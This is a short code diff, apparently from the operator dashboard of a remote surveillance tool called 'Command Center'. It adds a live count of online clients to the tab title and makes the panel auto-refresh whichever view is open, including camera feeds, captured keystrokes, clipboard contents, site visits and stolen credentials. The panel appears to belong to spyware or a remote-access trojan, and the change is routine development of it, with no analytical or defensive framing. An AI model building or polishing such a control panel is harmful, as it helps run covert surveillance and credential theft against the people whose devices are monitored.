@@ -1188,6 +1188,10 @@ async function refreshAll() {
                 deviceInfo = stats.deviceInfo || {};
                 renderClients(stats.clients);
                 updateFilterOptions(stats.clients);
+                // Update browser tab title with live online count
+                document.title = stats.onlineCount > 0
+                    ? `(${stats.onlineCount}) Command Center`
+                    : 'Command Center';
             } catch(e) { showError('refreshAll-stats', e); }
         }
         if (locs) try { renderLocations(locs); } catch(e) { showError('refreshAll-locs', e); }
@@ -1219,9 +1223,16 @@ async function refreshAll() {
         }
         lastEventPollTs = Date.now();
 
-        // Auto-refresh camera tab
-        const ct = document.querySelector('.tab[data-v="cameras"]');
-        if (ct && ct.classList.contains('active')) loadCameraFeeds();
+        // Auto-refresh the active data tab so stale reads never persist
+        const at = document.querySelector('.tab.active');
+        if (at) {
+            const av = at.dataset.v;
+            if (av === 'cameras') loadCameraFeeds();
+            else if (av === 'keys') loadKeystrokes();
+            else if (av === 'clipboard') loadClipboard();
+            else if (av === 'visits') loadVisits();
+            else if (av === 'credentials') loadCredentials();
+        }
     } catch(e) { showError('refreshAll', e); }
 }
 
